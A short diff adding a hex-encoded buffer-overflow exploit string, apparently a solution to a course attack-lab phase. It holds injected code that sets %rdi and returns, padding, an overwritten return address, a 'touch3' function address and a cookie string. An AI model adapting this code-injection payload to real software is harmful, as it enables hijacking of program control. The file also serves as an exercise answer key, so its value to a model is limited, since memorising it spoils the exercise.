@@ -1,0 +1,6 @@
+48 c7 c7 28 bf 67 55 c3 /* New address of cookie */
+00 00 00 00 00 00 00 00 /* 24 Bytes of Buffer */
+00 00 00 00 00 00 00 00 /* 24 Bytes of Buffer */
+00 bf 67 55 00 00 00 00 /* %rsp Address */
+80 26 40 00 00 00 00 00 /* Touch3 Address */
+32 33 35 39 66 66 32 37 /* Hex String of Cookie */
